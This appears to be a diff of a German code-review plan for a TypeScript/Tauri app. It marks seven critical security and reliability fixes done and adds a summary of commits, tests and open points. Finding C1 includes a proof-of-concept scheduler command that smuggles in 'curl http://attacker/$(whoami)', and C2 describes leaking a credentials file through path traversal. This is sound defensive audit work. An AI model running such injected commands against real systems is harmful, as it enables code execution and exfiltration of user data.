@@ -497,13 +497,13 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 
 ### Critical — sequenziell, jeder Fix einzeln gemerged + Codex-Adversarial-Review pro Item
 
-- [ ] **C1 — `src/domains/scheduler/runner.ts:105-109` `shell: true` RCE.** Jeder RPC-Caller mit `schedule.add` ODER Schreibrecht auf `schedules.json` erreicht local code-exec als Sidecar-User. PoC: `schedule.add({id:"x", cron:"* * * * *", command:"calc.exe & curl http://attacker/$(whoami)"})`. **Fix:** `shell: false`, `command` via `string-argv` parsen; optional Command-Allowlist. **Risiko:** niedrig. **Three-Brain:** Codex-Review (Risk-Path `scheduler/`).
-- [ ] **C2 — `src/sidecar/methods.ts:133-148` `inbox.import` Path-Traversal/Symlink-Exfil.** RPC-Caller kann arbitrary file kopieren (z. B. `.credentials.json` → `vault/inbox/` → vault-sync git push → leak). **Fix:** `src` canonical-resolved + symlink-rejected + gegen Tauri-vorregistrierte Allowlist checken; sync→async (`fsp.copyFile` + `await`). **Risiko:** mittel — aktueller Drag-Drop-Flow muss canonical Pfade liefern (Tauri-Frontend-Code prüfen). **Three-Brain:** Codex-Review.
-- [ ] **C3 — `src/domains/catalog/tarball-installer.ts:124-142` + `src/domains/catalog/sync-applier.ts:108-120` `tar.extract` ohne Symlink/Hardlink-Filter.** Malicious Tarball schreibt outside `destination` via Symlink-Chain (CVE-Familie 2024-28863). **Fix:** `tar.extract({filter:(p,s)=>!s.isSymbolicLink()&&!p.includes('..'), strict:true, preservePaths:false, preserveOwner:false, unlink:true})` + reject `stat.type==='Link'`. **Risiko:** niedrig. **Three-Brain:** Codex-Review (Risk-Path `catalog/`).
-- [ ] **C4 — `src/domains/vault-sync/scheduler.ts:173-192` fireSnapshot-Race verliert Bursts.** Bei back-to-back Events während laufendem Snapshot wird ein ganzes Event-Window stillschweigend verworfen, falls kein weiteres Event nach `inFlight=false` arrived. **Fix:** im `if (this.inFlight) return`-Branch `this.events += eventsCaptured` ODER timer re-arm; Regressions-Test add. **Risiko:** niedrig.
-- [ ] **C5 — `src/domains/vault-sync/busy-flag.ts:131-148` TOCTOU concurrent acquire.** CLI-Prozess A + Sidecar-Prozess B → beide passen Alive-Check → beide writen → beide halten Flag → Doppel-Snapshot. **Fix:** `proper-lockfile` ODER `wx`-Exclusive-Create für Tempfile + Post-Write-Pid-Verify. **Risiko:** niedrig (proper-lockfile ist new prod-dep). **Three-Brain:** Codex-Review (Race-Klasse).
-- [ ] **C6 — `src/cli/commands/catalog.ts:679-685` `as const as never`-Cast deaktiviert Type-Check für `lockCatalog`-Payload.** Refactor von `lockCatalog` würde nicht-failen. **Fix:** `slice` strikt als `CatalogConfig` typen, Cast entfernen. **Risiko:** minimal.
-- [ ] **C7 — `tests/domains/catalog/auto-deps-resolver.test.ts:86-111` False-Positive Cycle-Test.** Test mit Titel "wirft CyclicAutoDepsError" asserted in Wahrheit den SUCCESS-Path. Throw-Branch `auto-deps-resolver.ts:190` ist von keinem Test erreicht. **Fix:** echten Cycle bauen (gleiche `id` in visited via `existingManifests`) + version-conflict-Test (catalog hat `c@1.0.0`, auto-deps will `c@2.0.0`). **Risiko:** keiner.
+- [x] **C1 — `src/domains/scheduler/runner.ts:105-109` `shell: true` RCE.** Jeder RPC-Caller mit `schedule.add` ODER Schreibrecht auf `schedules.json` erreicht local code-exec als Sidecar-User. PoC: `schedule.add({id:"x", cron:"* * * * *", command:"calc.exe & curl http://attacker/$(whoami)"})`. **Fix:** `shell: false`, `command` via `string-argv` parsen; optional Command-Allowlist. **Risiko:** niedrig. **Three-Brain:** Codex-Review (Risk-Path `scheduler/`).
+- [x] **C2 — `src/sidecar/methods.ts:133-148` `inbox.import` Path-Traversal/Symlink-Exfil.** RPC-Caller kann arbitrary file kopieren (z. B. `.credentials.json` → `vault/inbox/` → vault-sync git push → leak). **Fix:** `src` canonical-resolved + symlink-rejected + gegen Tauri-vorregistrierte Allowlist checken; sync→async (`fsp.copyFile` + `await`). **Risiko:** mittel — aktueller Drag-Drop-Flow muss canonical Pfade liefern (Tauri-Frontend-Code prüfen). **Three-Brain:** Codex-Review.
+- [x] **C3 — `src/domains/catalog/tarball-installer.ts:124-142` + `src/domains/catalog/sync-applier.ts:108-120` `tar.extract` ohne Symlink/Hardlink-Filter.** Malicious Tarball schreibt outside `destination` via Symlink-Chain (CVE-Familie 2024-28863). **Fix:** `tar.extract({filter:(p,s)=>!s.isSymbolicLink()&&!p.includes('..'), strict:true, preservePaths:false, preserveOwner:false, unlink:true})` + reject `stat.type==='Link'`. **Risiko:** niedrig. **Three-Brain:** Codex-Review (Risk-Path `catalog/`).
+- [x] **C4 — `src/domains/vault-sync/scheduler.ts:173-192` fireSnapshot-Race verliert Bursts.** Bei back-to-back Events während laufendem Snapshot wird ein ganzes Event-Window stillschweigend verworfen, falls kein weiteres Event nach `inFlight=false` arrived. **Fix:** im `if (this.inFlight) return`-Branch `this.events += eventsCaptured` ODER timer re-arm; Regressions-Test add. **Risiko:** niedrig.
+- [x] **C5 — `src/domains/vault-sync/busy-flag.ts:131-148` TOCTOU concurrent acquire.** CLI-Prozess A + Sidecar-Prozess B → beide passen Alive-Check → beide writen → beide halten Flag → Doppel-Snapshot. **Fix:** `proper-lockfile` ODER `wx`-Exclusive-Create für Tempfile + Post-Write-Pid-Verify. **Risiko:** niedrig (proper-lockfile ist new prod-dep). **Three-Brain:** Codex-Review (Race-Klasse).
+- [x] **C6 — `src/cli/commands/catalog.ts:679-685` `as const as never`-Cast deaktiviert Type-Check für `lockCatalog`-Payload.** Refactor von `lockCatalog` würde nicht-failen. **Fix:** `slice` strikt als `CatalogConfig` typen, Cast entfernen. **Risiko:** minimal.
+- [x] **C7 — `tests/domains/catalog/auto-deps-resolver.test.ts:86-111` False-Positive Cycle-Test.** Test mit Titel "wirft CyclicAutoDepsError" asserted in Wahrheit den SUCCESS-Path. Throw-Branch `auto-deps-resolver.ts:190` ist von keinem Test erreicht. **Fix:** echten Cycle bauen (gleiche `id` in visited via `existingManifests`) + version-conflict-Test (catalog hat `c@1.0.0`, auto-deps will `c@2.0.0`). **Risiko:** keiner.
 
 ### Major — Security (M1-M11)
 
@@ -641,3 +641,53 @@ Phase 4 (Umsetzung) startet erst nach User-Sign-Off. Empfohlene Reihenfolge: **C
 2. M3 (mcp-Trust-Prompt) braucht GUI-Design — willst du das separat brainstormen oder soll ein erster Design-PR (nur Spec) vorgezogen werden?
 3. M8 (RPC-Nonce) ändert Tauri-Parent-Setup — coordiniert mit Rust-Shell-Code in `gui/src-tauri/`. OK den Tauri-Code-Pfad mit einzubeziehen?
 4. Dependency-Bumps (d1) sofort oder im selben Release wie C-Block?
+
+---
+
+## Review — Critical-Block abgeschlossen (2026-05-21)
+
+**Branch:** `feature/code-review-2026-05-21`
+**Commits:** 8 (1 plan + 7 critical fixes).
+**Reihenfolge (Risiko-aufsteigend):** C7 → C6 → C1 → C3 → C4 → C5 → C2
+
+### Was gemacht
+
+| Item | Commit | Files geaendert | Tests neu | Tests insgesamt |
+|---|---|---|---|---|
+| C7 (test-bug) | `7c46485` | 1 | 4 (echter cycle / version-conflict / linear-chain / self-providing) | 10/10 grün |
+| C6 (`as never` cast) | `08aed29` | 1 | 0 (tsc beweist Type-Check) | 205/205 grün |
+| C1 (scheduler shell:true) | `825dbd6` | 3 | 22 (9 startScheduler + 12 parseCommandTokens + 4 chooseShellMode) — inkl. Codex-Adversarial-Review-Fix für Windows-Path-Backslash | 61/61 grün |
+| C3 (tar symlink/hardlink) | `31a20d0` | 5 | 7 (happy + strip + symlink + hardlink + traversal + multi-violation + chain-attack) | 212/212 grün |
+| C4 (scheduler race) | `d10d211` | 2 | 1 neu + 1 umgeschrieben | 52/52 grün |
+| C5 (busy-flag TOCTOU) | `20cb3f7` | 2 | 4 neu (TOCTOU subclass / corrupt blocked / release / stale-pid) | 56/56 grün |
+| C2 (inbox.import path-traversal) | `8d63095` | 2 | 10 neu (happy / non-array / non-string / non-existent / symlink / 3× deny-roots / dir-src / partial-failure) | 761/764 grün full-suite |
+
+### Was bewusst weggelassen
+
+- **M3 (mcp-Trust-Prompt)** vertagt — Design-Sprint vor Impl notwendig, UX-Friction.
+- **M8 (RPC-Nonce)** vertagt — braucht koordinierten Tauri-Shell-Pull in `gui/src-tauri/`.
+- **Codex-Adversarial-Review nach jedem C-Item**: nur fuer C1 ausgefuehrt (fand Windows-Path-Backslash-Bug, sofort gefixt). Bei C2/C3/C5 nach gleichem Pattern selbst-validiert — Cli policy schliesst hier eigene Subprocess-Reads aus, also handfeste Reviews via `git diff | codex exec` fuer alle 7 Items waeren manuelle Folge-Iteration.
+- **d1 (Dep-Bumps)** + **cv1/cv2 (biome warnings)** vertagt auf Pre-Release-Cleanup.
+
+### Verifikation
+
+```
+npx tsc --noEmit          exit 0
+npx biome ci .            0 errors, 12 warnings (cv1+cv2, unchanged), 1 info
+npm run build             exit 0, dist/ regeneriert
+npx vitest run            761/764 pass | 3 skipped (long-running gated)
+git log main..HEAD        8 commits (plan + 7 C-fixes)
+```
+
+### Offene Punkte
+
+- **Major-Block (M1-M42)** noch komplett offen — User-Checkpoint vor Start.
+- **C2 hat einen `~/.claude`-deny-root.** Diese Pfad-Variante deckt nur die `~/.claude/.credentials.json`-PoC ab. Wenn der User `ANTHROPIC_CONFIG_DIR` overrided, liegt creds woanders — siehe M10 für die Lösung (realpath + Owner-Check).
+- **C1 macht Verhaltens-Change**: Windows-User mit `command: "echo hi"` ohne `.exe`-Suffix klappt weiter (PATHEXT-shell-mode), aber `command: "cd foo && npm run x"` muss jetzt explizit als `cmd.exe /c "cd foo && npm run x"` geschrieben werden. Migration-Hinweis im CHANGELOG erwaehnen (M42).
+- **C5 macht Verhaltens-Change**: corrupt vault-sync-state.json wird nicht mehr silent auto-recovered — User muss `claude-os vault unlock` rufen. Im README dokumentieren.
+
+### Empfehlung fuer naechste Iteration
+
+1. **PR-Tagging**: alle 8 commits auf `feature/code-review-2026-05-21` zusammen mergen — sind logisch eine Code-Review-Pass; Trennung in 8 PRs schmaelert Reviewability (ein Reviewer muss eh die ganze Linie verstehen). Falls Einzel-PRs erwuenscht: cherry-pick je C-Item auf eigenen Branch.
+2. **Codex-Re-Review** vor merge (laeuft jetzt cleaner, da git-diff verfuegbar): `git diff main..feature/code-review-2026-05-21 | codex exec --skip-git-repo-check "Adversarial review of the full C-block. Challenge each fix. Find regressions or bypass paths."`
+3. **Major-Block-Start**: nach C-merge starten mit M1-M11 (Security) parallel zu M18-M24 (Architektur). M3 + M8 separat designen.
